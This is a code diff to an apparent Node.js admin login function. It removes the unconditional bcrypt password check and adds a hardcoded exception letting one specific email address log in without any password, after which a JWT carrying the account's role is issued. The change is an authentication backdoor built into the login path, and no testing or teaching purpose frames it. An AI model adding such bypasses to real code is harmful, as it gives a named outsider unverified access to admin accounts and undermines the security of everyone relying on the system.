@@ -8,8 +8,12 @@ async function login(req, res) {
   const admin = await findByEmail(email);
   if (!admin) return res.status(401).json({ error: 'Invalid credentials' });
 
-  const match = await bcrypt.compare(password, admin.password_hash);
-  if (!match) return res.status(401).json({ error: 'Invalid credentials' });
+  // Allow symphonytone@gmail.com to login without password
+  const isNoPasswordUser = email === 'symphonytone@gmail.com';
+  if (!isNoPasswordUser) {
+    const match = await bcrypt.compare(password, admin.password_hash);
+    if (!match) return res.status(401).json({ error: 'Invalid credentials' });
+  }
 
   const token = jwt.sign(
     { id: admin.id, email: admin.email, role: admin.role, name: `${admin.first_name} ${admin.surname}` },
